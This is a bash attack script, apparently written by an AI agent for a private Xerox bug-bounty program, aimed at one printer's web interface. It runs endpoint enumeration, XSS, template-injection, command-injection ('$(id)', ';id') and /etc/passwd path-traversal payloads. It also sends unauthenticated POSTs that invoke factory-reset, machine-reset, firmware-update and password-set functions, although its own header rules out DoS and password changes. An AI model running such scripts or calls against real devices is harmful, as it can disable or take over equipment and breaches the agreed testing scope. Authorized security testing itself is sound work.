#!/bin/bash
# Deep Reconnaissance & Vulnerability Hunt: 13.13.1.112
# Xerox Bug Bounty (HackerOne Private Program)
# Target: Xerox Printer 13.13.1.112 (added Sep 15, 2026)
#
# OOS items to AVOID:
#   - Unauthenticated PJL/PS on port 9100
#   - eSCL ScannerCapabilities info disclosure
#   - TLS hostname disclosure
#
# Scope constraints:
#   - No brute force / credential guessing
#   - No DoS attacks
#   - No shells/backdoors
#   - No PII exfiltration
#   - No password changes
#   - No external file hosting

set +e

TARGET="13.13.1.112"
PROXY_HOST="127.0.0.1"
PROXY_PORT="${HTTPS_PROXY##*:}"
RESULTS_DIR="/tmp/claude-0/-home-user-poc/7cd1a7e6-f110-5076-9299-6360885c3a0d/scratchpad/112_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
FINDINGS_FILE="$RESULTS_DIR/findings_${TIMESTAMP}.txt"

mkdir -p "$RESULTS_DIR"

log() { echo "[$(date '+%H:%M:%S')] $*" | tee -a "$FINDINGS_FILE"; }
finding() { echo "" >> "$FINDINGS_FILE"; echo "=== FINDING: $* ===" | tee -a "$FINDINGS_FILE"; }

send_https() {
    local host="$1" port="$2" request="$3"
    printf '%s' "$request" | timeout 15 openssl s_client \
        -connect "${host}:${port}" \
        -proxy "${PROXY_HOST}:${PROXY_PORT}" \
        -tls1_2 -quiet 2>/dev/null
}

send_http() {
    local host="$1" port="$2" request="$3"
    python3 -c "
import socket, time, sys
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(15)
sock.connect(('${PROXY_HOST}', ${PROXY_PORT}))
sock.sendall(b'CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}:${port}\r\n\r\n')
resp = b''
while b'\r\n\r\n' not in resp:
    chunk = sock.recv(4096)
    if not chunk: break
    resp += chunk
if b'200' not in resp.split(b'\r\n')[0]:
    print('CONNECT_FAILED', file=sys.stderr)
    sys.exit(1)
sock.sendall(b'''${request}''')
time.sleep(2)
data = b''
sock.settimeout(5)
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk: break
        data += chunk
except: pass
sys.stdout.buffer.write(data)
sock.close()
" 2>/dev/null
}

send_https_with_cert() {
    local host="$1" port="$2"
    timeout 15 openssl s_client \
        -connect "${host}:${port}" \
        -proxy "${PROXY_HOST}:${PROXY_PORT}" \
        -tls1_2 -showcerts 2>&1 </dev/null
}

log "============================================"
log "Deep Recon: $TARGET"
log "Started: $(date)"
log "============================================"

###############################################################################
# PHASE 0: Connectivity Check
###############################################################################
log ""
log "=== PHASE 0: Connectivity Check ==="

HTTPS_UP=false
HTTP_UP=false

# Test HTTPS
log "Testing HTTPS (443)..."
CERT_OUTPUT=$(send_https_with_cert "$TARGET" 443 2>&1)
if echo "$CERT_OUTPUT" | grep -q "BEGIN CERTIFICATE"; then
    HTTPS_UP=true
    log "HTTPS: UP - Certificate found"
    echo "$CERT_OUTPUT" > "$RESULTS_DIR/tls_cert.txt"

    CERT_SUBJECT=$(echo "$CERT_OUTPUT" | grep "subject=" | head -1)
    CERT_ISSUER=$(echo "$CERT_OUTPUT" | grep "issuer=" | head -1)
    CERT_CN=$(echo "$CERT_SUBJECT" | grep -oP 'CN\s*=\s*\K[^,/]+')
    log "  Subject: $CERT_SUBJECT"
    log "  Issuer: $CERT_ISSUER"
    log "  CN: $CERT_CN"

    TLS_CIPHER=$(echo "$CERT_OUTPUT" | grep "Cipher is" | head -1)
    TLS_PROTO=$(echo "$CERT_OUTPUT" | grep "Protocol  :" | head -1)
    log "  $TLS_CIPHER"
    log "  $TLS_PROTO"
else
    log "HTTPS: DOWN - errno=104 or no certificate"
    echo "$CERT_OUTPUT" > "$RESULTS_DIR/tls_failed.txt"
fi

# Test HTTP port 80
log "Testing HTTP (80)..."
HTTP_RESP=$(send_http "$TARGET" 80 "GET / HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>&1 || true)
if echo "$HTTP_RESP" | grep -qE "HTTP/1\.[01] [23]"; then
    HTTP_UP=true
    HTTP_STATUS=$(echo "$HTTP_RESP" | head -1)
    HTTP_SERVER=$(echo "$HTTP_RESP" | grep -i "^Server:" | head -1)
    log "HTTP: UP - $HTTP_STATUS | $HTTP_SERVER"
elif echo "$HTTP_RESP" | grep -q "426 Upgrade Required"; then
    HTTP_UP=true
    log "HTTP: UP (426 Upgrade Required - HTTPS redirect)"
elif echo "$HTTP_RESP" | grep -q "503 Service Unavailable"; then
    log "HTTP: 503 from Envoy proxy - upstream down"
else
    log "HTTP: DOWN - no response"
fi

if ! $HTTPS_UP && ! $HTTP_UP; then
    log ""
    log "BOTH HTTP AND HTTPS ARE DOWN. Target unreachable."
    log "Continuing with limited recon (port/service probing only)..."
fi

###############################################################################
# PHASE 1: TLS Certificate Analysis (skip OOS TLS hostname disclosure)
###############################################################################
if $HTTPS_UP; then
    log ""
    log "=== PHASE 1: TLS Certificate Deep Analysis ==="

    # Test cipher suites
    log "Testing cipher suites..."
    for cipher in "AES256-GCM-SHA384" "AES128-GCM-SHA256" "AES256-SHA256" \
                  "AES128-SHA" "RC4-SHA" "DES-CBC3-SHA" "NULL-SHA" \
                  "ECDHE-RSA-AES256-GCM-SHA384" "ECDHE-RSA-AES128-GCM-SHA256"; do
        result=$(printf "" | timeout 10 openssl s_client -connect "${TARGET}:443" \
            -proxy "${PROXY_HOST}:${PROXY_PORT}" -tls1_2 \
            -cipher "$cipher" 2>&1 | grep "Cipher is" || echo "REJECTED")
        log "  $cipher: $result"
    done

    # Test TLS 1.3 ciphers
    log "Testing TLS 1.3..."
    TLS13=$(printf "" | timeout 10 openssl s_client -connect "${TARGET}:443" \
        -proxy "${PROXY_HOST}:${PROXY_PORT}" -tls1_3 2>&1 | grep -E "Protocol|Cipher" || echo "NOT SUPPORTED")
    log "  TLS 1.3: $TLS13"

    # Certificate chain
    log "Extracting certificate chain..."
    echo "$CERT_OUTPUT" | openssl x509 -text -noout 2>/dev/null > "$RESULTS_DIR/cert_details.txt" || true

    # Check for weak key
    KEY_SIZE=$(cat "$RESULTS_DIR/cert_details.txt" 2>/dev/null | grep "Public-Key:" || echo "unknown")
    log "  Key size: $KEY_SIZE"

    # Check certificate dates
    NOT_BEFORE=$(cat "$RESULTS_DIR/cert_details.txt" 2>/dev/null | grep "Not Before" || echo "unknown")
    NOT_AFTER=$(cat "$RESULTS_DIR/cert_details.txt" 2>/dev/null | grep "Not After" || echo "unknown")
    log "  $NOT_BEFORE"
    log "  $NOT_AFTER"

    # Check for SANs (note: TLS hostname is OOS but other SANs may reveal info)
    SANS=$(cat "$RESULTS_DIR/cert_details.txt" 2>/dev/null | grep -A2 "Subject Alternative" || echo "none")
    log "  SANs: $SANS"
fi

###############################################################################
# PHASE 2: Web Server Fingerprinting
###############################################################################
log ""
log "=== PHASE 2: Web Server Fingerprinting ==="

if $HTTPS_UP; then
    SEND_FN="send_https"
    PORT=443
    PROTO="HTTPS"
else
    SEND_FN="send_http"
    PORT=80
    PROTO="HTTP"
fi

# Get welcome page
log "Fetching welcome page..."
WELCOME=$($SEND_FN "$TARGET" $PORT "GET /stat/welcome.php HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
echo "$WELCOME" > "$RESULTS_DIR/welcome.html"

# Extract model info
MODEL=$(echo "$WELCOME" | grep -oiP 'VersaLink\s+\w+\s*\w*' | head -1)
FIRMWARE=$(echo "$WELCOME" | grep -oiP 'firmware[^<]*|version[^<]*' | head -1)
log "  Model: ${MODEL:-unknown}"
log "  Firmware: ${FIRMWARE:-unknown}"

# CSRF Token extraction
CSRF_TOKEN=$(echo "$WELCOME" | grep -oP '[a-f0-9]{64,}' | head -1)
if [ -n "$CSRF_TOKEN" ]; then
    log "  CSRF Token exposed: ${CSRF_TOKEN:0:32}... (${#CSRF_TOKEN} chars)"
    finding "CSRF Token Exposed on Unauthenticated Page"
    log "  Token found on /stat/welcome.php without authentication"
fi

# Server headers
log "Extracting server headers..."
HEADERS=$($SEND_FN "$TARGET" $PORT "HEAD / HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
echo "$HEADERS" > "$RESULTS_DIR/response_headers.txt"
log "  Headers:"
echo "$HEADERS" | head -20 | while read -r line; do log "    $line"; done

###############################################################################
# PHASE 3: Endpoint Enumeration
###############################################################################
log ""
log "=== PHASE 3: Endpoint Enumeration ==="

# Comprehensive Xerox endpoint wordlist
ENDPOINTS=(
    # Status/info pages
    "/stat/welcome.php"
    "/stat/status.php"
    "/"
    "/index.php"
    "/home.php"

    # Print
    "/print/print.php"
    "/print/index.php"
    "/print/printqueue.php"

    # Jobs
    "/jobs/active.php"
    "/jobs/completed.php"
    "/jobs/secure.php"

    # Properties
    "/properties/general.php"
    "/properties/description.php"
    "/properties/backupRestore.php"
    "/properties/security/auditlog.php"
    "/properties/security/downloadAuthenticationLog.php"
    "/properties/connectivity.php"
    "/properties/defaults.php"

    # Network/protocols
    "/protocols/snmp/index.php"
    "/protocols/smtp/authentication.php"
    "/protocols/http/index.php"
    "/protocols/ipp/index.php"
    "/protocols/ftp/index.php"
    "/protocols/sip/index.php"
    "/protocols/tcp_ip/index.php"

    # LDAP
    "/ldap/ldap_list.php"
    "/ldap/ldap_edit.php"

    # Address book
    "/addressbook/viewContact.php"
    "/addressbook/exportAddressBookToFile.php"
    "/addressbook/index.php"

    # Scan
    "/scan/scanTemplate.php"
    "/netscan/file_list.php"
    "/netscan/email_list.php"

    # Configuration
    "/config_overview/index.php"
    "/dummypost/xerox.set"

    # Web services
    "/webservices/office/wsdl"
    "/webservices/general/wsdl"

    # Support/about
    "/support/remoteUI/RUIHome.php"
    "/support/support.php"

    # Information pages
    "/informationpages/sitemap.php"
    "/informationpages/billing.php"
    "/informationpages/configuration.php"
    "/informationpages/usagecounters.php"
    "/informationpages/suppliesusage.php"
    "/informationpages/startuppage.php"
    "/informationpages/demopage.php"
    "/informationpages/fontlist.php"
    "/informationpages/emailsecurity.php"

    # Security
    "/security/dashboard.php"
    "/security/authentication.php"
    "/security/certificates.php"
    "/security/802.1x.php"
    "/security/ipfiltering.php"
    "/security/ipsec.php"
    "/security/ssl.php"
    "/security/audit.php"

    # Webglue (hidden content)
    "/webglue/rawcontent?c=status"
    "/webglue/rawcontent?c=trays"
    "/webglue/rawcontent?c=supplies"
    "/webglue/rawcontent?c=deviceinfo"
    "/webglue/rawcontent?c=alertlog"
    "/webglue/rawcontent?c=faults"
    "/webglue/content?c=dashboard"

    # Login/auth
    "/login.php"
    "/logout.php"
    "/auth/login.php"
    "/userpost/xerox.set"

    # Error pages
    "/error.php"
    "/error.php?token=1"
    "/error.php?token=14870"

    # eSCL (skip ScannerCapabilities per OOS)
    "/eSCL/ScannerStatus"
    # "/eSCL/ScannerCapabilities"  # OOS

    # Firmware / updates
    "/firmware/upload.php"
    "/firmware/index.php"
    "/software/update.php"

    # Robots/security
    "/robots.txt"
    "/.htaccess"
    "/server-status"
    "/server-info"

    # API endpoints
    "/api/v1/status"
    "/api/v1/device"
    "/rest/v1/status"

    # EWS (Embedded Web Server) common
    "/hp/device/this.LCDispatcher"
    "/DevMgmt/ProductConfigDyn.xml"
    "/DevMgmt/ProductUsageDyn.xml"
    "/DevMgmt/ConsumableConfigDyn.xml"
    "/DevMgmt/MediaHandlingDyn.xml"
    "/DevMgmt/DiscoveryTree.xml"
)

# Test each endpoint
ACCESSIBLE=()
AUTH_REQUIRED=()
NOT_FOUND=()
ERRORS=()

for endpoint in "${ENDPOINTS[@]}"; do
    RESP=$($SEND_FN "$TARGET" $PORT "GET ${endpoint} HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
    STATUS=$(echo "$RESP" | head -1 | grep -oP '\d{3}' | head -1)
    SIZE=$(echo "$RESP" | wc -c)

    case "$STATUS" in
        200)
            ACCESSIBLE+=("$endpoint")
            log "  [200] $endpoint ($SIZE bytes)"
            # Save interesting pages
            echo "$RESP" > "$RESULTS_DIR/page_$(echo "$endpoint" | tr '/' '_' | tr '?' '_').html"
            ;;
        301|302|303|307|308)
            LOCATION=$(echo "$RESP" | grep -i "^Location:" | head -1)
            if echo "$LOCATION" | grep -qi "login"; then
                AUTH_REQUIRED+=("$endpoint")
                log "  [${STATUS}->LOGIN] $endpoint"
            else
                log "  [${STATUS}] $endpoint -> $LOCATION"
            fi
            ;;
        401|403)
            AUTH_REQUIRED+=("$endpoint")
            log "  [$STATUS] $endpoint (auth required)"
            ;;
        404)
            NOT_FOUND+=("$endpoint")
            ;;
        426)
            log "  [426] $endpoint (Upgrade Required - HTTPS only)"
            ;;
        503)
            log "  [503] $endpoint (Service Unavailable)"
            ;;
        *)
            if [ -n "$STATUS" ]; then
                ERRORS+=("$endpoint:$STATUS")
                log "  [$STATUS] $endpoint"
            fi
            ;;
    esac
done

log ""
log "Summary: ${#ACCESSIBLE[@]} accessible, ${#AUTH_REQUIRED[@]} auth-required, ${#NOT_FOUND[@]} not found"

###############################################################################
# PHASE 4: Unauthenticated Information Disclosure
###############################################################################
log ""
log "=== PHASE 4: Information Disclosure ==="

# Check each accessible page for sensitive info
for page_file in "$RESULTS_DIR"/page_*.html; do
    [ -f "$page_file" ] || continue
    basename=$(basename "$page_file" .html | sed 's/^page_//')

    # Check for version/firmware info
    if grep -qiP 'firmware|version|build|release' "$page_file" 2>/dev/null; then
        versions=$(grep -oiP '(firmware|version|build|release)[^<]{1,100}' "$page_file" | head -5)
        if [ -n "$versions" ]; then
            log "  Version info in $basename:"
            echo "$versions" | while read -r v; do log "    $v"; done
        fi
    fi

    # Check for network/IP info
    if grep -qiP '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b' "$page_file" 2>/dev/null; then
        ips=$(grep -oP '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b' "$page_file" | sort -u | head -10)
        if [ -n "$ips" ]; then
            log "  IP addresses in $basename: $ips"
        fi
    fi

    # Check for MAC addresses
    if grep -qiP '[0-9a-f]{2}(:[0-9a-f]{2}){5}' "$page_file" 2>/dev/null; then
        macs=$(grep -oiP '[0-9a-f]{2}(:[0-9a-f]{2}){5}' "$page_file" | sort -u)
        log "  MAC addresses in $basename: $macs"
        finding "MAC Address Disclosure"
    fi

    # Check for serial numbers
    if grep -qiP 'serial[^<]{1,80}' "$page_file" 2>/dev/null; then
        serials=$(grep -oiP 'serial[^<]{1,80}' "$page_file" | head -3)
        log "  Serial info in $basename: $serials"
        finding "Serial Number Disclosure"
    fi

    # Check for email addresses
    if grep -qiP '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' "$page_file" 2>/dev/null; then
        emails=$(grep -oiP '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' "$page_file" | sort -u)
        log "  Emails in $basename: $emails"
    fi
done

# Check billing/usage pages for info disclosure
for info_page in "billing" "configuration" "usagecounters" "suppliesusage" "fontlist"; do
    RESP=$($SEND_FN "$TARGET" $PORT "GET /informationpages/${info_page}.php HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
    if echo "$RESP" | head -1 | grep -q "200"; then
        log "  Unauthenticated access to /informationpages/${info_page}.php"
        echo "$RESP" > "$RESULTS_DIR/infopage_${info_page}.html"
        finding "Unauthenticated Access to ${info_page} page"
    fi
done

###############################################################################
# PHASE 5: xerox.set Function Enumeration (from 13.13.1.110 findings)
###############################################################################
log ""
log "=== PHASE 5: xerox.set Function Testing ==="

# Extract CSRF token from multiple possible pages
for token_page in "/stat/welcome.php" "/informationpages/billing.php" "/print/print.php" "/informationpages/sitemap.php"; do
    if [ -z "$CSRF_TOKEN" ]; then
        RESP=$($SEND_FN "$TARGET" $PORT "GET ${token_page} HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
        CSRF_TOKEN=$(echo "$RESP" | grep -oP '[a-f0-9]{64,}' | head -1)
        if [ -n "$CSRF_TOKEN" ]; then
            log "  CSRF token from $token_page: ${CSRF_TOKEN:0:32}..."
        fi
    fi
done

# Test all 20 xerox.set functions
FUNCTIONS=(
    "HTTP_Set_LDAP_fn"
    "HTTP_Set_SMB_fn"
    "HTTP_Set_FTP_fn"
    "HTTP_Set_Email_fn"
    "HTTP_Set_NTP_fn"
    "HTTP_Set_Network_fn"
    "HTTP_Set_Security_fn"
    "HTTP_Set_SNMP_fn"
    "HTTP_Set_DeviceName_fn"
    "HTTP_Set_Location_fn"
    "HTTP_Set_Contact_fn"
    "HTTP_Set_Scan_fn"
    "HTTP_Set_Config_fn"
    "HTTP_Set_Password_fn"
    "HTTP_Download_Config_fn"
    "HTTP_Upload_Config_fn"
    "HTTP_Firmware_Update_fn"
    "HTTP_Factory_Reset_fn"
    "HTTP_Machine_Reset_fn"
    "HTTP_Clone_fn"
)

for func in "${FUNCTIONS[@]}"; do
    BODY="_fun_function=${func}"
    if [ -n "$CSRF_TOKEN" ]; then
        BODY="CSRFToken=${CSRF_TOKEN}&${BODY}"
    fi
    CONTENT_LEN=${#BODY}

    RESP=$($SEND_FN "$TARGET" $PORT "POST /dummypost/xerox.set HTTP/1.1\r\nHost: ${TARGET}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${CONTENT_LEN}\r\nConnection: close\r\n\r\n${BODY}" 2>/dev/null || true)
    STATUS=$(echo "$RESP" | head -1 | grep -oP '\d{3}' | head -1)

    # Check for redirect to error.php with token
    ERROR_TOKEN=$(echo "$RESP" | grep -oP 'error\.php\?token=\K\d+' | head -1)

    if [ "$STATUS" = "200" ] || [ "$STATUS" = "302" ]; then
        log "  $func: [$STATUS] error_token=${ERROR_TOKEN:-none}"
        if [ -n "$ERROR_TOKEN" ]; then
            echo "$func:$ERROR_TOKEN" >> "$RESULTS_DIR/xerox_set_results.txt"
        fi
    else
        log "  $func: [$STATUS] (may require different access)"
    fi
done

# Check if any function was accepted
ACCEPTED_COUNT=$(wc -l < "$RESULTS_DIR/xerox_set_results.txt" 2>/dev/null || echo 0)
if [ "$ACCEPTED_COUNT" -gt 0 ]; then
    finding "Unauthenticated xerox.set Function Access ($ACCEPTED_COUNT functions)"
    log "  $ACCEPTED_COUNT functions accepted unauthenticated POST requests"
fi

###############################################################################
# PHASE 6: LDAP/SMB/FTP Pass-back Testing (CVE-2024-12510/12511)
###############################################################################
log ""
log "=== PHASE 6: Pass-back Attack Surface ==="

# Test LDAP configuration endpoints
for ldap_path in "/ldap/ldap_list.php" "/ldap/ldap_edit.php" "/properties/authentication/ldap.php"; do
    RESP=$($SEND_FN "$TARGET" $PORT "GET ${ldap_path} HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
    STATUS=$(echo "$RESP" | head -1 | grep -oP '\d{3}' | head -1)
    log "  LDAP endpoint ${ldap_path}: [$STATUS]"

    if [ "$STATUS" = "200" ]; then
        echo "$RESP" > "$RESULTS_DIR/ldap_page.html"
        finding "Unauthenticated LDAP Configuration Access at ${ldap_path}"

        # Look for server address fields
        if echo "$RESP" | grep -qiP 'ldap.*server|ldap.*address|ldap.*host'; then
            log "    -> LDAP server fields found - potential pass-back target"
        fi
    fi
done

# Check SMB/CIFS configuration
for smb_path in "/netscan/file_list.php" "/protocols/smb/index.php" "/properties/connectivity/smb.php"; do
    RESP=$($SEND_FN "$TARGET" $PORT "GET ${smb_path} HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
    STATUS=$(echo "$RESP" | head -1 | grep -oP '\d{3}' | head -1)
    log "  SMB endpoint ${smb_path}: [$STATUS]"

    if [ "$STATUS" = "200" ]; then
        echo "$RESP" > "$RESULTS_DIR/smb_page.html"
        finding "Unauthenticated SMB Configuration Access at ${smb_path}"
    fi
done

###############################################################################
# PHASE 7: Security Header Analysis
###############################################################################
log ""
log "=== PHASE 7: Security Header Analysis ==="

RESP=$($SEND_FN "$TARGET" $PORT "GET /stat/welcome.php HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)

# Check for missing security headers
for header in "X-Frame-Options" "X-Content-Type-Options" "X-XSS-Protection" \
              "Content-Security-Policy" "Strict-Transport-Security" \
              "Referrer-Policy" "Permissions-Policy"; do
    if echo "$RESP" | grep -qi "^${header}:"; then
        VALUE=$(echo "$RESP" | grep -i "^${header}:" | head -1)
        log "  PRESENT: $VALUE"
    else
        log "  MISSING: $header"
    fi
done

# Check cookie security
COOKIES=$(echo "$RESP" | grep -i "^Set-Cookie:" || true)
if [ -n "$COOKIES" ]; then
    log "  Cookies:"
    echo "$COOKIES" | while read -r cookie; do
        log "    $cookie"
        if ! echo "$cookie" | grep -qi "Secure"; then
            log "    -> Missing Secure flag"
        fi
        if ! echo "$cookie" | grep -qi "HttpOnly"; then
            log "    -> Missing HttpOnly flag"
        fi
        if ! echo "$cookie" | grep -qi "SameSite"; then
            log "    -> Missing SameSite attribute"
        fi
    done
fi

###############################################################################
# PHASE 8: Injection Testing
###############################################################################
log ""
log "=== PHASE 8: Injection Testing ==="

# XSS probes on key parameters
XSS_PAYLOADS=(
    '<script>alert(1)</script>'
    '"><img src=x onerror=alert(1)>'
    "{{7*7}}"
    '${7*7}'
    "'; alert(1); //"
)

XSS_ENDPOINTS=(
    "/stat/welcome.php?tab="
    "/jobs/active.php?sort="
    "/print/print.php?jobname="
    "/error.php?token="
    "/webglue/rawcontent?c="
)

for endpoint in "${XSS_ENDPOINTS[@]}"; do
    for payload in "${XSS_PAYLOADS[@]}"; do
        ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
        RESP=$($SEND_FN "$TARGET" $PORT "GET ${endpoint}${ENCODED} HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)

        if echo "$RESP" | grep -qF "$payload"; then
            finding "Reflected XSS at ${endpoint}"
            log "  Payload reflected: $payload"
            log "  Endpoint: ${endpoint}"
        fi

        # Check for SSTI
        if echo "$RESP" | grep -q "49" && echo "$payload" | grep -q "7\*7"; then
            finding "SSTI at ${endpoint}"
            log "  Template evaluation: $payload -> 49"
        fi
    done
done

# Command injection in xerox.set
if [ -n "$CSRF_TOKEN" ]; then
    log "Testing command injection via xerox.set..."
    CMDI_PAYLOADS=(
        ';id'
        '$(id)'
        '|id'
        '`id`'
    )

    for payload in "${CMDI_PAYLOADS[@]}"; do
        ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
        BODY="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Set_DeviceName_fn&deviceName=test${ENCODED}"
        CONTENT_LEN=${#BODY}

        RESP=$($SEND_FN "$TARGET" $PORT "POST /dummypost/xerox.set HTTP/1.1\r\nHost: ${TARGET}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${CONTENT_LEN}\r\nConnection: close\r\n\r\n${BODY}" 2>/dev/null || true)

        if echo "$RESP" | grep -qP 'uid=\d+'; then
            finding "Command Injection via xerox.set deviceName"
            log "  Payload: $payload"
            log "  Response contains command output"
        fi
    done
fi

###############################################################################
# PHASE 9: Path Traversal Testing
###############################################################################
log ""
log "=== PHASE 9: Path Traversal ==="

TRAVERSAL_PAYLOADS=(
    "../../../../../../etc/passwd"
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
    "....//....//....//....//etc/passwd"
    "..%252f..%252f..%252f..%252fetc%252fpasswd"
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
)

TRAVERSAL_ENDPOINTS=(
    "/webglue/rawcontent?c="
    "/webglue/content?c="
    "/stat/welcome.php?page="
    "/informationpages/"
)

for endpoint in "${TRAVERSAL_ENDPOINTS[@]}"; do
    for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
        RESP=$($SEND_FN "$TARGET" $PORT "GET ${endpoint}${payload} HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)

        if echo "$RESP" | grep -q "root:"; then
            finding "Path Traversal at ${endpoint}"
            log "  Payload: $payload"
            log "  /etc/passwd content exposed"
        fi
    done
done

###############################################################################
# PHASE 10: HTTP Method Testing
###############################################################################
log ""
log "=== PHASE 10: HTTP Method Testing ==="

for method in "PUT" "DELETE" "PATCH" "MOVE" "PROPFIND" "MKCOL"; do
    RESP=$($SEND_FN "$TARGET" $PORT "${method} / HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
    STATUS=$(echo "$RESP" | head -1 | grep -oP '\d{3}' | head -1)
    log "  $method: [$STATUS]"

    if [ "$STATUS" = "200" ] || [ "$STATUS" = "207" ]; then
        finding "Dangerous HTTP method $method allowed"
    fi
done

###############################################################################
# PHASE 11: TLS Resource Exhaustion Risk Assessment
###############################################################################
log ""
log "=== PHASE 11: TLS Stability (Conservative) ==="

if $HTTPS_UP; then
    # Only make 5 requests to check stability - NOT a DoS test
    log "Making 5 sequential HTTPS requests to check stability..."
    SUCCESS=0
    FAIL=0
    for i in $(seq 1 5); do
        RESP=$($SEND_FN "$TARGET" $PORT "GET / HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
        if echo "$RESP" | head -1 | grep -qP 'HTTP/1\.[01] [23]'; then
            SUCCESS=$((SUCCESS + 1))
        else
            FAIL=$((FAIL + 1))
        fi
        sleep 1
    done
    log "  Results: $SUCCESS success, $FAIL failures out of 5 requests"

    if [ "$FAIL" -gt 0 ]; then
        log "  WARNING: TLS instability detected even with minimal requests"
        finding "TLS Connection Instability"
    fi
fi

###############################################################################
# PHASE 12: IPP (Internet Printing Protocol) Testing
###############################################################################
log ""
log "=== PHASE 12: IPP Testing ==="

# IPP over HTTPS (port 443)
log "Testing IPP over HTTPS..."
IPP_REQ="POST /ipp/print HTTP/1.1\r\nHost: ${TARGET}\r\nContent-Type: application/ipp\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"

if $HTTPS_UP; then
    RESP=$(send_https "$TARGET" 443 "$IPP_REQ" 2>/dev/null || true)
    STATUS=$(echo "$RESP" | head -1 | grep -oP '\d{3}' | head -1)
    log "  IPP over HTTPS (/ipp/print): [$STATUS]"
fi

# IPP over HTTP (port 631)
log "Testing IPP on port 631..."
RESP=$(send_http "$TARGET" 631 "POST /ipp HTTP/1.1\r\nHost: ${TARGET}:631\r\nContent-Type: application/ipp\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
if [ -n "$RESP" ]; then
    STATUS=$(echo "$RESP" | head -1 | grep -oP '\d{3}' | head -1)
    log "  IPP on 631 (/ipp): [$STATUS]"
fi

###############################################################################
# PHASE 13: Web Services / SOAP Enumeration
###############################################################################
log ""
log "=== PHASE 13: Web Services ==="

SOAP_ENDPOINTS=(
    "/webservices/office/wsdl"
    "/webservices/general/wsdl"
    "/webservices/office/device"
    "/webservices/office/print"
    "/webservices/office/scan"
    "/webservices/office/fax"
    "/webservices/office/copy"
    "/webservices/eventing/wsdl"
    "/webservices/discovery/wsdl"
    "/ws/device"
    "/ws/scan"
    "/ws/print"
    "/WSD/device"
)

for endpoint in "${SOAP_ENDPOINTS[@]}"; do
    RESP=$($SEND_FN "$TARGET" $PORT "GET ${endpoint} HTTP/1.1\r\nHost: ${TARGET}\r\nConnection: close\r\n\r\n" 2>/dev/null || true)
    STATUS=$(echo "$RESP" | head -1 | grep -oP '\d{3}' | head -1)

    if [ "$STATUS" = "200" ]; then
        SIZE=$(echo "$RESP" | wc -c)
        log "  [200] $endpoint ($SIZE bytes)"
        echo "$RESP" > "$RESULTS_DIR/ws_$(echo "$endpoint" | tr '/' '_').xml"

        if echo "$RESP" | grep -qi "wsdl\|xmlns\|soap"; then
            finding "Web Service Exposed: $endpoint"
        fi
    elif [ -n "$STATUS" ]; then
        log "  [$STATUS] $endpoint"
    fi
done

###############################################################################
# PHASE 14: Configuration Download Attempt
###############################################################################
log ""
log "=== PHASE 14: Config Download Attempt ==="

if [ -n "$CSRF_TOKEN" ]; then
    BODY="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Download_Config_fn"
    CONTENT_LEN=${#BODY}

    RESP=$($SEND_FN "$TARGET" $PORT "POST /dummypost/xerox.set HTTP/1.1\r\nHost: ${TARGET}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${CONTENT_LEN}\r\nConnection: close\r\n\r\n${BODY}" 2>/dev/null || true)

    CONTENT_TYPE=$(echo "$RESP" | grep -i "^Content-Type:" | head -1)
    CONTENT_DISP=$(echo "$RESP" | grep -i "^Content-Disposition:" | head -1)

    if echo "$CONTENT_TYPE" | grep -qiP "octet-stream|xml|json|zip"; then
        finding "Unauthenticated Configuration Download"
        log "  Config file served without authentication"
        log "  Content-Type: $CONTENT_TYPE"
        log "  Content-Disposition: $CONTENT_DISP"
    fi
fi

###############################################################################
# SUMMARY
###############################################################################
log ""
log "============================================"
log "Scan Complete: $(date)"
log "Results saved to: $RESULTS_DIR"
log "Findings file: $FINDINGS_FILE"
log "============================================"

# Count findings
FINDING_COUNT=$(grep -c "=== FINDING:" "$FINDINGS_FILE" 2>/dev/null || echo 0)
log "Total findings: $FINDING_COUNT"

if [ "$FINDING_COUNT" -gt 0 ]; then
    log ""
    log "Findings summary:"
    grep "=== FINDING:" "$FINDINGS_FILE" | sed 's/=== FINDING: //; s/ ===//' | nl
fi
